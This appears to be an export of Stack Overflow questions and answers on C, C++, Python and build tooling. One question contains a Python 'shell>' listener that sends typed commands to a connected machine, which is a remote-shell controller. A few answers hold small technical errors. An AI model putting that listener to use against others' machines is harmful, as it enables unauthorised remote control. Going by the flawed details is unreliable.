        gcc -shared bar.o -o libbar.so
        gcc main.o  -Wl,-rpath=. -L . -lbar -lfoo -o main
</code></pre>

<hr>

<p>Now, in Linux, this compiles and runs just fine:</p>

<pre><code>$ make
gcc -fPIC -c foo.c
gcc -fPIC -c bar.c
gcc -fPIC -c main.c
gcc -shared foo.o -o libfoo.so
gcc -shared bar.o -o libbar.so
gcc main.o  -Wl,-rpath=. -L . -lbar -lfoo -o main

$ ./main 
Hello World!
Hello World!
</code></pre>

<p>In Windows, we need to change so to dll, which is minor and fine:</p>

<pre><code>$ cat Makefile 
.c.o:
        gcc -fPIC -c $&lt;

all: foo.o bar.o main.o
        gcc -shared foo.o -o libfoo.dll
        gcc -shared bar.o -o libbar.dll
        gcc main.o  -Wl,-rpath=. -L . -lbar -lfoo -o main
</code></pre>

<p>However, when we try to build, we get the following error:</p>

<pre><code>$ make
gcc -fPIC -c foo.c
foo.c:1:0: warning: -fPIC ignored for target (all code is position independent) [enabled by default]
gcc -fPIC -c bar.c
bar.c:1:0: warning: -fPIC ignored for target (all code is position independent) [enabled by default]
gcc -fPIC -c main.c
main.c:1:0: warning: -fPIC ignored for target (all code is position independent) [enabled by default]
gcc -shared foo.o -o libfoo.dll
gcc -shared bar.o -o libbar.dll
bar.o:bar.c:(.text+0x7): undefined reference to `printme'
bar.o:bar.c:(.text+0xc): undefined reference to `printme'
collect2.exe: error: ld returned 1 exit status
make: *** [all] Error 1
</code></pre>

<p>Now, we can fix the error by simply including the objects from foo.o into libbar.dll:</p>

<pre><code>$ cat Makefile 
.c.o:
        gcc -fPIC -c $&lt;

all: foo.o bar.o main.o
        gcc -shared foo.o -o libfoo.dll
        gcc -shared bar.o foo.o -o libbar.dll
        gcc main.o  -Wl,-rpath=. -L . -lbar -lfoo -o main

$ make
gcc -fPIC -c foo.c
foo.c:1:0: warning: -fPIC ignored for target (all code is position independent) [enabled by default]
gcc -fPIC -c bar.c
bar.c:1:0: warning: -fPIC ignored for target (all code is position independent) [enabled by default]
gcc -fPIC -c main.c
main.c:1:0: warning: -fPIC ignored for target (all code is position independent) [enabled by default]
gcc -shared foo.o -o libfoo.dll
gcc -shared bar.o foo.o -o libbar.dll
gcc main.o -Wl,-rpath=. -L . -lbar -lfoo -o main 

$ ./main 
Hello World!
Hello World!
</code></pre>

<p>However, I don't like this approach since libbar.dll now contains symbols for both foo and bar.  In Linux, it only contains symbols for bar.  This separation is important for situations where a library depends on some standard numerical library like BLAS.  I'd like to be able to deploy the shared library and have it depend on the optimized version of the numerical library on the user's machine and not my own.</p>

<p>In any case, what's the proper procedure to create a shared library where not all of the symbols are present at compile time?</p>

<p>In case it matters, I compiled these examples with gcc 4.6.3 on Linux and mingw-get-inst-20120426.exe with gcc 4.7.2 on Windows.</p>
","9530","","<p>On Windows, you need to create an <em>import library</em> for the DLL.  An import library looks like a static library, in that it defines all of the needed symbols, but it doesn't have the actual function implementations, it just has stubs.  The import library will resolve the ""undefined reference"" errors while avoiding static linking.</p>

<p>To create an import library with MinGW, follow the instructions <a href=""http://www.mingw.org/wiki/sampleDLL"" rel=""nofollow"">here</a>.  The key is that when building the DLL, you must pass the option <code>-Wl,--out-implib,libexample_dll.a</code> to the linker to generate the import library <code>libexample_dll.a</code>.</p>

<p>Then, when you compile your main executable, you use the <code>-lexample_dll</code> option (along with <code>-L.</code>) to link against the import library.  So with your code, I think this should work:</p>

<pre><code>all: foo.o bar.o main.o
    gcc -shared foo.o -o libfoo.dll -Wl,--out-implib,libfoo.a
    gcc -shared bar.o foo.o -o libbar.dll -Wl,--out-implib,libbar.a
    gcc main.o  -Wl,-rpath=. -L. -lbar -lfoo -o main
</code></pre>

<p>Also, note that on Windows, the calling convention for exported functions in DLL is almost always <code>__stdcall</code>, not the default <code>__cdecl</code>, so if you want your DLLs to be usable by other software, I'd recommend making them <code>__cdecl</code>.  But that's not strictly requires, as long as both the code in the DLL and the header files agree on what the calling convention is.</p>
"
"<p>I have char a[4] and in it:
<code>a[0] = 0x76</code>
<code>a[1] = 0x58</code>
<code>a[2] = 0x02</code>
<code>a[3] = 0x00</code>
And I want print it as <code>int</code>, can you tell me how to do that?</p>
","9530","","<p>If you want to read it as a big- or little-endian integer, just do some bit shifting:</p>

<pre><code>char a[4] = {0x76, 0x58, 0x02, 0x00};

// Big-endian:
uint32_t x = ((uint8_t)a[0] &lt;&lt; 24) | ((uint8_t)a[1] &lt;&lt; 16) | ((uint8_t)a[2] &lt;&lt; 8) | (uint8_t)a[3];

// Little-endian:
uint32_t y = (uint8_t)a[0] | ((uint8_t)a[1] &lt;&lt; 8) | ((uint8_t)a[2] &lt;&lt; 16) | ((uint8_t)a[3] &lt;&lt; 24);
</code></pre>

<p>If you want to read it as a native-endian integer, you can either cast the array to a pointer to an integer and dereference that.  Note that the former is allowed <strong>only</strong> for <code>char</code> arrays -- for any other types, doing so breaks C's strict aliasing rules, so that would not be safe or portable.  For example:</p>

<pre><code>char a[4] = {0x76, 0x58, 0x02, 0x00};

// Cast to pointer to integer and dereference.  This is only allowed if `a' is an
// array of `char'.
uint32_t x = *(uint32_t *)a;
</code></pre>

<p>Alternatively, you can use a union, or just <code>memcpy()</code> the data directly.  Both of these are safe and portable, as long as a <code>char</code> is 8 bits (its size in bits is given by the macro <code>CHAR_BIT</code>).</p>

<pre><code>char a[4] = {0x76, 0x58, 0x02, 0x00};
uint32_t x;

// Copy the data directly into x
memcpy(&amp;x, a, sizeof(x));

// Use a union to perform the cast
union
{
    char a[4];
    uint32_t x;
} u;
memcpy(u.a, a, sizeof(a));
// u.x now contains the integer value
</code></pre>

<p>Note that I've used <code>uint32_t</code> in all of the examples above, since an <code>int</code> is not guaranteed to be 4 bytes on all systems.  The type <code>uint32_t</code> is defined in the header file <code>&lt;stdint.h&gt;</code>, and if it's defined by your compiler, it's guaranteed to be 32 bits wide.</p>
"
"<p>How can I get the value of <code>IP</code> register in my  <code>C</code> program?
for example for getting value of <code>AX</code>  and <code>BX</code> registers we have pseudo variables <code>_AX and _BX</code> .
Is there any pseudo variable for <code>IP</code> register too?
or there is any other method?
Note: I need value of <code>IP</code> register because it store the offset address of next instruction to be executed?</p>
","9530","","<p>You cannot do it in plain C, since C has no concept of CPU registers.  Depending on what compiler you're using, you need to either use:</p>

<ul>
<li>A compiler intrinsic;</li>
<li>Inline assembly; or</li>
<li>External assembly routine</li>
</ul>

<p>Check your compiler's documentation to see if there's an intrinsic available.  Assuming there's none available, assembly of some sort will be your only option.  x86 doesn't have an instruction to directly read the IP register.  Instead, you'll need to use something like a <code>call</code> instruction (which stores the next IP on the stack) to get at it.</p>

<p>Here's one way to get the IP on x86 (AT&amp;T syntax):</p>

<pre><code>.globl get_ip
get_ip:
    mov 0(%sp), %ax
    ret
</code></pre>

<p>Then in you C code, you can do this:</p>

<pre><code>uint16_t get_ip();
...
uint16_t ip = get_ip();
</code></pre>

<p>If your compiler supports inline assembly, then you can use that to write the <code>get_ip</code> function inside your C source code, instead of needing a separate assembly source file.  Consult your compiler's documentation on the syntax of inline assembly, if it's available.</p>

<p>The above of course assumes you're working in the 16-bit assembly, which I'm assuming since you mentioned the registers AX, BX, and IP in your question.  But if you want this to work for 32-bit code, then of course you need to rename the registers to <code>%esp</code>, <code>%eax</code>, and <code>%eip</code>, and <code>get_eip()</code> would then return a <code>uint32_t</code> instead of <code>uint16_t</code>.</p>
"
"<p>program:</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;sstream&gt;
int main()
{
    std::stringstream ss;
    ss &lt;&lt; ""hello world "" &lt;&lt; 1234 &lt;&lt; ""\n"";
    std::string str = ss.str();
    printf(str.c_str());
    return 0;
}
</code></pre>

<p>makefile:</p>

<pre><code>CC=/usr/local/gcc-4.6.2/bin/g++
CFLAGS=-g -c -W -m32 -Wa,-mtune=pentiumiii
LINKFLAGS=-m32 -static-libgcc -static-libstdc++ -Wl,-rpath,./runtime,--dynamic-linker,./runtime/ld-linux.so.2
all:test
test: list_test.o
    $(CC) $(LINKFLAGS) list_test.o -o test 

list_test.o: list_test.cpp
    $(CC) $(CFLAGS) list_test.cpp

clean:
     rm *.o ./test -f
</code></pre>

<p>I build it in 64-bit linux. there is an illegal instruction when it run in 32-bit linux with pentinum(R) III cpu. </p>

<p>the illegal instruction is as follow:</p>

<pre><code>(gdb) disas 0x0804f77a 0x0804f77b
Dump of assembler code from 0x804f77a to 0x804f77b:
0x0804f77a &lt;std::basic_stringbuf&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::_M_sync(std::basic_stringbuf&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::char_type*, std::basic_stringbuf&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::__size_type, std::basic_stringbuf&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::__size_type)+138&gt;:     movq   %xmm0,0xc(%esp)
</code></pre>

<p>End of assembler dump.</p>

<p>How to resolve this problem?</p>
","9530","","<p>The instruction <code>movq   %xmm0,0xc(%esp)</code> is part of the <a href=""http://en.wikipedia.org/wiki/Streaming_SIMD_Extensions"" rel=""nofollow"">Streaming SIMD Extensions (SSE)</a> instruction set.  The Pentium III in theory supports SSE, but the processor you're trying to run it in apparently doesn't.  You can disable the generation of SSE instructions on GCC with the <a href=""http://gcc.gnu.org/onlinedocs/gcc/i386-and-x86_002d64-Options.html#index-mno_002dsse-1484"" rel=""nofollow""><code>-mno-sse</code></a> compiler option.  You can also try <a href=""http://gcc.gnu.org/onlinedocs/gcc/i386-and-x86_002d64-Options.html"" rel=""nofollow""><code>-march=pentium3</code></a> to generate code compatible with Pentium III and above.</p>

<p>Also, your <code>printf</code> call has a bug—you should (almost) never pass a non-constant string as the format argument (the first argument).  If that string happens to contain any <code>%</code> signs in it, that will lead to undefined behavior.  At best, this will crash, and at worst, you could have a silent security vulnerability.  The fix is to do this:</p>

<pre><code>printf(""%s"", str.c_str());
</code></pre>

<p>Or better yet, avoid the potential problems with the <code>printf</code> family of functions entirely, since you're using C++:</p>

<pre><code>std::cout &lt;&lt; str;  // Optionally also do `&lt;&lt; std::flush'
</code></pre>
"
"<p>When I try to receive larger amounts of data it gets cut off and I have to press enter to get the rest of the data. At first I was able to increase it a little bit but it still won't receive all of it. As you can see I have increased the buffer on the conn.recv() but it still doesn't get all of the data. It cuts it off at a certain point. I have to press enter on my raw_input in order to receive the rest of the data. Is there anyway I can get all of the data at once? Here's the code. </p>

<pre><code>port = 7777
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('0.0.0.0', port))
sock.listen(1)
print (""Listening on port: ""+str(port))
while 1:
    conn, sock_addr = sock.accept()
    print ""accepted connection from"", sock_addr
    while 1:
        command = raw_input('shell&gt; ')
            conn.send(command)
                data = conn.recv(8000)
                if not data: break
                print data,
    conn.close()
</code></pre>
","9530","","<p>TCP/IP is a <em>stream-based</em> protocol, not a <em>message-based</em> protocol.  There's no guarantee that every <code>send()</code> call by one peer results in a single <code>recv()</code> call by the other peer receiving the exact data sent—it might receive the data piece-meal, split across multiple <code>recv()</code> calls, due to packet fragmentation.</p>

<p>You need to define your own message-based protocol on top of TCP in order to differentiate message boundaries.  Then, to read a message, you continue to call <code>recv()</code> until you've read an entire message or an error occurs.</p>

<p>One simple way of sending a message is to prefix each message with its length.  Then to read a message, you first read the length, then you read that many bytes.  Here's how you might do that:</p>

<pre><code>def send_msg(sock, msg):
    # Prefix each message with a 4-byte length (network byte order)
    msg = struct.pack('&gt;I', len(msg)) + msg
    sock.sendall(msg)

def recv_msg(sock):
    # Read message length and unpack it into an integer
    raw_msglen = recvall(sock, 4)
    if not raw_msglen:
        return None
    msglen = struct.unpack('&gt;I', raw_msglen)[0]
    # Read the message data
    return recvall(sock, msglen)

def recvall(sock, n):
    # Helper function to recv n bytes or return None if EOF is hit
    data = ''
    while len(data) &lt; n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data += packet
   return data
</code></pre>

<p>Then you can use the <code>send_msg</code> and <code>recv_msg</code> functions to send and receive whole messages, and they won't have any problems with packets being split or coalesced on the network level.</p>
"
"<p>I have used:</p>

<pre><code>typedef struct entity {
    int health;
    int damage;
    SDL_Rect hitbox;
} player, basicEnemy[10];
</code></pre>

<p>To handle my player (and enemies). My problem is that I get:</p>

<pre><code>error: expected unqualified-id before '-' token
</code></pre>

<p>For this line (and one similiar):</p>

<pre><code>if( keystate[SDLK_LEFT] )  player.hitbox.x -= 1;
</code></pre>

<p>How do I fix this?
If I don't have typedef on the struct the error doesn't occur, but another one does (which is why I made it have typedef)</p>

<p>Headers:</p>

<pre><code>#include ""SDL.h""
#include ""SDL\SDL.h""
#include &lt;string&gt;
</code></pre>
","9530","","<p>You most likely have some macro (maybe <code>hitbox</code>?) being defined unexpectedly in some header file you're including, which is resulting in a syntax error when expanded.</p>

<p>Try running your code through the preprocessor and looking at the preprocessed output.  With GCC and GCC-compatible compilers, this can be done by passing the <a href=""http://gcc.gnu.org/onlinedocs/gcc/Preprocessor-Options.html#Preprocessor-Options"" rel=""nofollow""><code>-E</code> command line flag</a> instead of <code>-c</code>.  For example:</p>

<pre><code>g++ myfile.cpp -E -o myfile.ii
</code></pre>

<p><code>.ii</code> is the recommended file extension for preprocessed C++ files, but it's not required.  Take a look at that file and see what's happening on the line where you're getting the error.</p>

<p>With Visual Studio, you'd instead use the <a href=""http://msdn.microsoft.com/en-us/library/8z9z0bx6%28v=vs.71%29.aspx"" rel=""nofollow""><code>/P</code> option</a>.  For other compilers, check your compiler's documentation on how to look at the preprocessed output.</p>
"
"<p>I occasionally do ""ls -laR /"" on my system and offsite backup the
results. If disaster strikes, I'll at least know which files I've lost.</p>

<p>I recently started sshfs mounting remote systems, yielding two problems:</p>

<ul>
<li><p>""ls -laR"" on sshfs mounted systems is painfully slow</p></li>
<li><p>I don't need the ""ls -laR"" results of remote filesystems, at least
not locally.</p></li>
</ul>

<p>What's the ls equivalent of find's ""-xdev"" option or du's ""-x"" option?</p>

<p>In case there's a better way to do it, my goal is to efficiently get a
list of all files on my hard drive with size, owner, mod time, etc. In
other words, all the info ""ls -l"" would normally provide.</p>

<p>I've considered: ""find / -xdev | xargs ls -la"", but I sense that would
be less efficient.</p>
","9530","","<p>Use the <code>-ls</code> action with <code>find(1)</code>, which prints out the file stats like <code>ls -dils</code> would:</p>

<pre><code>find / -xdev -ls
</code></pre>

<p>If the <code>ls -dils</code> format isn't your thing, you can also use the <code>-exec ... +</code> action, which works similarly to <code>xargs(1)</code> but is more efficient:</p>

<pre><code>find / -xdev -exec ls -l '{}' +
</code></pre>

<p>The <code>+</code> instructs <code>find</code> to pass as many filenames as it can into the subprocess, so it only spawns as few subprocesses as necessary (which is determined by the maximum size of command line arguments on your OS).  If you use a <code>;</code> instead of <code>+</code>, then <code>find</code> creates one process per file, which is very slow when you have a lot of files, so that's not recommended.</p>
"
"<p>What is the delegate method for detecting when application was closed.</p>

<p>I mean when user tap this button:</p>

<p><img src=""http://i.stack.imgur.com/Zlilt.png"" alt=""enter image description here""></p>

<p>I know about method below:</p>

<pre><code>- (void)applicationDidEnterBackground:(UIApplication *)application;

- (void)applicationWillEnterForeground:(UIApplication *)application;
</code></pre>

<p>But they work not as I expected in my case. For example I have used my app and I have navigated to some screen. In case when I lock screen and go back to app the app calls applicationWillEnterForeground but I don't need this, because I am still on this view (for example Test Screen View)and I don't need to check any changes. But in case if my app closed I begin to navigate from start app for example Home Screen. So if my app was closed and I am on Home Screen I need to check if in previous time I had some actions (for example if I passed test on Test Screen View) and present this view controller (ONLY IN CASE IF I CLOSED APP NOT JUST LOCKED IT OR ENTER BACKGROUND).</p>

<p>Thanks for help.</p>
","9530","","<p>You can implement the <a href=""http://developer.apple.com/library/ios/#DOCUMENTATION/UIKit/Reference/UIApplicationDelegate_Protocol/Reference/Reference.html#//apple_ref/occ/intfm/UIApplicationDelegate/applicationWillTerminate%3a"" rel=""nofollow""><code>-applicationWillTerminate:</code></a> method of your <code>UIApplicationDelegate</code> delegate to respond to termination events.  However, it's not guaranteed to be called in all cases, so you should not rely on it being called.  According to the <a href=""http://developer.apple.com/library/ios/#documentation/iPhone/Conceptual/iPhoneOSProgrammingGuide/ManagingYourApplicationsFlow/ManagingYourApplicationsFlow.html#//apple_ref/doc/uid/TP40007072-CH4-SW49"" rel=""nofollow"">iOS App Programming Guide</a>:</p>

<blockquote>
  <p>If your app is running (either in the foreground or background) at termination time, the system calls your app delegate’s <code>applicationWillTerminate:</code> method so that you can perform any required cleanup. You can use this method to save user data or app state information that you would use to restore your app to its current state on a subsequent launch. Your method has approximately 5 seconds to perform any tasks and return. If it does not return in time, the app is killed and removed from memory.</p>
  
  <p><strong>Important:</strong> The <code>applicationWillTerminate:</code> method is not called if your app is currently suspended.</p>
</blockquote>
"
"<p>I wanted to create a meaningful assert like so:</p>

<pre><code>assert((""precondition failed"", false));
</code></pre>

<p>And it workd fine under <em>GCC</em>, but <em>Clang</em> warns me about unused value, the value <code>""precondition failed""</code>.</p>

<p>Do you guys know some way to disable this warning in code (no command-line arguments or non-portable code, please)? Rewrite the assert is a fine answer too.</p>
","9530","","<p>Here are two ways, which generate no warnings even with <code>-Wall -Wextra pedantic</code>:</p>

<pre><code>assert(((void)""precondition failed"", false));  // #1
assert(""precondition failed"" &amp;&amp; false);        // #2
</code></pre>
"
"<p>i've encountered the following problem, and i'm not really sure whether i am wrong or its a really weird bug. I fill a huge array of strings and want it to be cleared at a certain point. Here's a minimal example</p>

<pre><code>#include &lt;string&gt;
#include &lt;vector&gt;
#include &lt;unistd.h&gt; //sleep
#include &lt;iostream&gt;

int main(){
    {
        std::vector&lt;std::string&gt; strvec;
        for(long i = 0; i &lt; 1000000; ++i){
            std::string out = ""This is gonna be a long string just to fill up the memory used by this fucking pthread\n"";
            strvec.push_back(out);
        }
        std::cout &lt;&lt; ""finished loading 1st\n"";
        sleep(10); // to monitor any changes    
    }
    std::cout &lt;&lt; ""out of scope\n"";
    sleep(10);
    return 0;
}
</code></pre>

<p>My Problem is, if i monitor memory usage with 'top', the memory usage decreases just by a very small amount (i think its probably the vector overhead), but the most seems not freed. How comes? I tested the same scenario with 'long long', but here everything went right.</p>

<p>The std::vector reference states, that, if the contained values are no pointers, the destructors are invoked. Seems not true for string though...</p>

<p>I appreciate every answer.</p>

<p>(for convenience: i'm using debian linux 64Bit with g++ 4.7.2)</p>

<p>EDIT: thanks for the answers so far.</p>

<p>by now i have profiled heap usage with vagrind massif, and (yeah, actually as expected) it gets properly freed at the point it should. But why do i in fact see a change in usage with a huge integer, but not with the strings (also whithin top)?</p>

<p>I need to be a little considerable about that, because i need to be able to free my memory  at certain times for a multithreaded server application, which will probably run several weeks or more without being restarted. When do i actually know when the C++ memory manager decides to give some mem back to the OS?</p>
","9530","","<p>Even if you free the memory properly, the standard library doesn't necessary free the memory back to the OS.</p>

<p>So for example, when you first allocate all of the memory, the library allocates a bunch of virtual memory address space from the OS (likely with <code>mmap(2)</code>) and doles it out.  But when you're done with that memory, it hangs onto the virtual address space under the assumption that you might want that memory back later, so it doesn't call <code>munmap(2)</code> to unmap the virtual address space.</p>

<p>Hence, even though all of the memory has been properly freed from your program's perspective, all the OS sees is that you allocated a bunch of virtual memory but then never freed it.  That's why <code>top(1)</code> reports your memory usage as not decreasing, but it's nothing to be concerned about.  When your program needs memory again, it'll allocate it from the virtual address space which you already have, so you won't see your apparent memory usage increase until all of that memory has been used up.</p>
"
"<p>Assume I have a hierarchy of classes:</p>

<pre><code>class Shape {
};

class Circle : public Shape {
}

class Square : public Shape {
}

... hundreds of other shapes continue on...
</code></pre>

<p>When given the name of a shape class as a string, I need to instantiate objects of that class.</p>

<p>In java, I can do something like this (pseudo code!)</p>

<pre><code>Shape createShape(String name) {
    return new Class.forName(name);
}
</code></pre>

<p>But in C++, I have to do this:  (pseudo code!)</p>

<pre><code>Shape * createShape(const string &amp;name) {
    if (name.compare(""Circle"") == 0) {  
        return new Circle();
    }
    else if (name.compare(""Square"") == 0) {
        return new Square();
    }
    else if ... //hundreds of else if continues, one for each shape
}
</code></pre>

<p>Is there any better way in C++ to handle situation like this?</p>
","9530","","<p>It's avoidable using the factory pattern, but you still need a bunch of boilerplate code to get off the ground.  For example:</p>

<pre><code>// Class factory functions -- these could also be inlined into their respective
// class definitions using a macro
Shape *createCircle() { return new Circle(); }
Shape *createSquare() { return new Square(); }
// etc.

// Create a map from type name to factory
typedef std::map&lt;std::string, Shape *(*)()&gt; ShapeFactoryMap;
ShapeFactoryMap factoryMap;
factoryMap[""Circle""] = &amp;createCircle;
factoryMap[""Square""] = &amp;createSquare;
// etc.
</code></pre>

<p>Then, when you want to instantiate an object, you can do this:</p>

<pre><code>ShapeFactoryMap::iterator factory = factoryMap.find(""Circle"");
if (factory != factoryMap.end())
{
    Shape *circle = factory-&gt;second();  // Creates a Circle instance
    ...
}
else
{
    // Handle error
}
</code></pre>

<p>Whether this is better than just doing a series of <code>if/else...</code> string comparisons is not clear, since it depends on what exactly you're doing to be doing with this.</p>
"
"<p>Why the size of <code>enum</code> is always <code>4</code> or <code>2 bytes</code> for <code>32 bit</code> or <code>16 bit</code> OS, no matter how many elements we have under that <code>enum</code>.</p>

<p>My Doubt <strong>-:</strong>  Is does compiler treat <code>enum</code> as <code>union</code>?</p>

<p>Need some help.</p>
","9530","","<p>The size of an enum is implementation-defined -- the compiler is allowed to choose whatever size it wants, as long as it's large enough to fit all of the values.  Some compilers choose to use 4-byte enums for all enum types, while some compilers will choose the smallest type (e.g. 1, 2, or 4 bytes) which can fit the enum values.  The C and C++ language standards allow both of these behaviors.</p>

<p>From C99 §6.7.2.2/4:</p>

<blockquote>
  <p>Each enumerated type shall be compatible with <code>char</code>, a signed integer type, or an
  unsigned integer type. The choice of type is implementation-defined,<sup>110)</sup> but shall be
  capable of representing the values of all the members of the enumeration.</p>
</blockquote>

<p>From C++03 §7.2/5:</p>

<blockquote>
  <p>The <em>underlying type</em> of an enumeration is an integral type that can represent all the enumerator values
  defined in the enumeration. It is implementation-defined which integral type is used as the underlying type
  for an enumeration except that the underlying type shall not be larger than <code>int</code> unless the value of an enumerator
  cannot fit in an <code>int</code> or <code>unsigned int</code>. If the <em>enumerator-list</em> is empty, the underlying type is
  as if the enumeration had a single enumerator with value 0. The value of <code>sizeof()</code> applied to an enumeration
  type, an object of enumeration type, or an enumerator, is the value of <code>sizeof()</code> applied to the
  underlying type.</p>
</blockquote>
"
"<p>I want to change the commands for setting bookmarks, listing them and finding them in emacs.
This is the emacs lisp code I have tried: </p>

<pre><code>(global-set-key (kbd ""C-c C-z"") (kbd ""C-x r m""))
</code></pre>

<p>This is failing. What is the correct method?</p>
","9530","","<p>The second argument of <a href=""http://www.gnu.org/software/emacs/manual/html_node/elisp/Key-Binding-Commands.html"" rel=""nofollow""><code>global-set-key</code></a> needs to be the symbol of the function you want to run.  In your case, the command <kbd><code>C-x r m</code></kbd> ordinarily corresponds to the <code>bookmark-set</code> (I determined this by running <kbd><code>C-x k C-x r m</code></kbd>), so you should pass <code>'bookmark-set</code>:</p>

<pre><code>(global-set-key (kbd ""C-c C-z"") 'bookmark-set)
</code></pre>
"
"<p>and sorry for the terrible title! I had no idea what to write, without making the tile 500 words long.</p>

<p>Let's say I have</p>

<pre><code>print 'Hi!'
print 'How are you?'
</code></pre>

<p>Is there any way I can get this into the same line? ""Hi! How are you?""</p>

<p>Here is the codes I am currently using:</p>

<pre><code>choice = raw_input('&gt;: ')
if choice=='1':
    menu1()
else:
    print '' +choice
    print 'is not a recognized commando.'
</code></pre>

<p>The other code I have is:</p>

<pre><code>from colorama import Fore, Back, Style
print
print 'Now chatting with Tom'
time.sleep(2)
print
print
print(Fore.RED + 'Tom &gt;: ') + print(Fore.GREEN + 'test')
</code></pre>

<p>Of course this didn't work. I just wanted to test.</p>

<p>Is there any way I can get these two string into the same line?</p>

<p>Thank you very much!</p>

<p><strong>EDIT:</strong></p>

<p>Thank you very much everyone! I know the most basic parts of Python, but I have no idea how I could ignore the <strong>,</strong></p>

<p>Anyway. For some reason I get extra spaces. I want to write [12:41:39] (time). In my code, it looks like this:</p>

<pre><code>print(Fore.YELLOW + '['),
print strftime(""%H:%M:%S""),
print ']          ',
</code></pre>

<p>And the output is [ 12:41:39 ]</p>

<p>I have no idea what's wrong here. I really hope someone here could explain this for me! Thank you!</p>
","9530","","<p>In Python 2.x, where <a href=""http://docs.python.org/2/reference/simple_stmts.html#the-print-statement""><code>print</code> is a statement</a>, add a trailing comma:</p>

<pre><code>print 'Hi!',  # No newline will be printed
</code></pre>

<p>In Python 3.x, where <a href=""http://docs.python.org/3/library/functions.html#print""><code>print()</code> is an ordinary function</a> instead of a statement, pass an empty string for the <code>end</code> keyword parameter:</p>

<pre><code>print('Hi!', end='')
</code></pre>

<p>If you use the <code>from __future__ import print_function</code> in Python 2.x code for forwards compatibility, then you'll need to use the function version instead of the statement version.</p>
"
"<p>I wrote some RegEx to play with spaces in strings, and it works beautifully, except for when I come across this character: "" "" instead of "" "". You probably think I'm crazy, but apparently they're different. Check out this RegEx app (oddly enough, it often crashes it):</p>

<p>When I use the weird space:</p>

<p><img src=""http://i.stack.imgur.com/81BMl.png"" alt=""enter image description here""></p>

<p>When I use a normal space:</p>

<p><img src=""http://i.stack.imgur.com/yVI53.png"" alt=""enter image description here""></p>

<p>As you can see, there are many more spaces detected here, but it doesn't detect the weird spaces.</p>

<p>What is this space? How do I get rid of it?</p>
","9530","","<p>Unicode has a lot of different <a href=""http://www.cs.tut.fi/~jkorpela/chars/spaces.html"" rel=""nofollow"">space characters</a>.  The space you posted in your question -- in both the title and the body -- is a regular ASCII space, good old U+0020.</p>

<p>If you want to check exactly what you've copied onto your clipboard, you can run the command <a href=""https://developer.apple.com/library/mac/documentation/Darwin/Reference/ManPages/man1/pbpaste.1.html"" rel=""nofollow""><code>pbpaste(1)</code></a> on Mac OS X.  For example, if you copied a non-breaking space (U+00A0), you could identify it like so:</p>

<pre><code># Write pasteboard contents to stdout, convert from UTF-8 to UTF-32 for easy
# code point identification, then hex dump the contents
$ pbpaste | iconv -f utf-8 -t utf-32be | hexdump -C
00000000  00 00 00 a0                                       |....|
00000004
</code></pre>

<p>Depending on the regex engine you're using, it may not support them all, especially if you use the <code>\s</code> character class.  If you want to be sure to match the space character you have, then include it explicitly in your character class, e.g. <code>[\s&lt;YOURSPACEHERE&gt;]</code>, where <code>&lt;YOURSPACEHERE&gt;</code> is copy+pasted from the character you want to match.</p>
"
"<p>As shown in below structure, 1 byte should be padded after <code>var1</code> and since <code>short</code> is used in structure, one more byte is padded after <code>var3</code>. With this, the total should be 6. That is the value I am getting in Visual Studio. It is also mentioned at Wikipedia on <a href=""http://en.wikipedia.org/wiki/Data_structure_alignment"" rel=""nofollow"">Data structure alignment</a>.</p>

<pre><code>typedef struct {char var1; short var2; char var3;} Bytes;
</code></pre>

<p>But in GCC it is giving the size as 8 bytes. Please let me know about the behaviour.</p>

<hr>

<p>Hi Jack,</p>

<p>I did experement with below structure.</p>

<pre><code>typedef struct
{
    char  charVar1;
    short shortVar2;
    char  charVar3;
}tsByte;

printf(""\n Sizeo of Byte        : %d"", sizeof(Byte));
printf(""\n Sizeo of charVar1    : %d"", sizeof(Byte.charVar1));
printf(""\n Sizeo of shortVar2   : %d"", sizeof(Byte.shortVar2));
printf(""\n Sizeo of charVar3    : %d"", sizeof(Byte.charVar3));
printf(""\n Address of charVar1  : %x"", &amp;Byte.charVar1);
printf(""\n Address of shortVar2 : %x"", &amp;Byte.shortVar2);
printf(""\n Address of shortVar3 : %x"", &amp;Byte.charVar3);
</code></pre>

<p>and the results are as below.</p>

<pre><code>Sizeo of Byte        : 8
Sizeo of charVar1    : 1
Sizeo of shortVar2   : 2
Sizeo of charVar3    : 1
Address of charVar1  : 4007e90
Address of shortVar2 : 4007e92
Address of shortVar3 : 4007e94
</code></pre>

<p>Usually padding at the end of a structure is necessary to ensure proper alignment (of all of its members) when the structure is used as an element of an array. But bit confused with padding for last element. Whether padding ""for last element"" is based on the 8/16/32-bit controller architecture or based on the biggest member size (here short).</p>

<p>I feel in Visual studio it is based on biggest member size and so you are getting size as 6 bytes. Whereas with gcc compiler it is based on controller architecture and since I am using 32-bit controller it is aligned with 4-byte memory. Because of this in gcc compiler it is 8 bytes. Please correct me if I am wrong.</p>
","9530","","<blockquote>
  <p>As shown in below structure, 1 byte should be padded after ‘var1’ and
  since short is used in structure, one more byte is padded after
  ‘var3’. <strong>With this, the total should be 6.</strong></p>
</blockquote>

<p>Wrong.  The C language does not stipulate what the total size must be -- it is implementation-defined.  The compiler is free to add padding bytes between members or at the end of the structure as it sees fit.  It may choose to add no padding, to align members on 2- or 4-byte boundaries, or something else entirely.  All of those behaviors are allowed by the C standard.</p>

<p>The fact that different compilers product different values just demonstrates that not all compilers are the same.  Both compilers are compliant with the C standard in this regard.</p>
"
"<p>I am trying to postpone a function call (using a function wrapper), by saving its arguments in a list of void pointers:</p>

<pre><code>void *args[]
int argt[]
</code></pre>

<p>The argt is used in order to remember the data type stored at void * location.</p>

<p>Later, I need to call the postponed function:</p>

<pre><code>function(args[0], args[1])
</code></pre>

<p>but the problem is that I must specify their type correctly.</p>

<p>I use a macro, like this:</p>

<pre><code>#define ARGTYPE(arg, type) type == CHARP ? (char *) arg : (type == LONGLONG ? *((long long *) arg) : NULL)
</code></pre>

<p>and the function call becomes:</p>

<pre><code>function(ARGTYPE(args[0], argt[0]), ARGTYPE(args[1], argt[1]))
</code></pre>

<p>I have two issues:</p>

<p>1) warning: pointer/integer type mismatch in conditional expression, generated by the macro definition (please note I can live with it, see 2))</p>

